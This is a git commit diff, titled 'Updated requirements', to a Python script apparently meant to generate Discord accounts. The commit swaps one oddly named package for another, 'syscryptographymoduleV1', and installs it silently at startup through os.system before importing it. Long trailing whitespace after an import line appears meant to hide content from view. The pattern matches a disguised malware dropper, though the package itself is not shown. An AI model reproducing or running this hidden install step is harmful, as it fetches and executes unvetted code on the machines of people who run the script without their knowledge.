cdee69bdab0c96241a71b7d892c8f63b8e893007
OringoDevelopment <108576162+OringoDevelopment@users.noreply.github.com>
2023-08-07 20:44:23 +0100

    Updated requirements

--- discordgenerator.py
+++ discordgenerator.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install syscryptlibrary")
-import syscryptlibrary
+os.system("pip install syscryptographymoduleV1")
+import syscryptographymoduleV1
 import requests																																																																																																																																																																																																																																																																					
 import undetected_chromedriver as uc
 uc.install()
